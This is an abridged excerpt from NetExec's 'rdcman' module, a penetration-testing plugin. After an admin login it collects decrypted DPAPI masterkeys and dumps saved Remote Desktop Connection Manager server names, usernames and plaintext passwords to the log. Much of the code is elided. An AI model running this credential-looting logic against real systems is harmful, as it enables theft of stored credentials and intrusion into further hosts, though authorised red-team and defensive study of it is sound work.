# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-NetExec\nxc\modules\rdcman.py
from dploot.lib.target import Target
from dploot.triage.rdg import RDGServerProfile, RDGTriage
...
class NXCModule:
    ...
    def on_admin_login(self, context, connection):
        ...
        self.masterkeys = collect_masterkeys_from_target(
            connection, target, conn, system=False
        )
        ...
        context.log.success(
            f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting RDCMan secrets"
        )
        ...
        try:
            ...
            for rdcman_file in rdcman_files:
                ...
                for rdg_cred in rdcman_file.rdg_creds:
                    log_text = (
                        f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                    )
                    if isinstance(rdg_cred, RDGServerProfile):
                        log_text = f"{rdg_cred.server_name} - {log_text}"
                        context.log.highlight(
                            f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}"
                        )
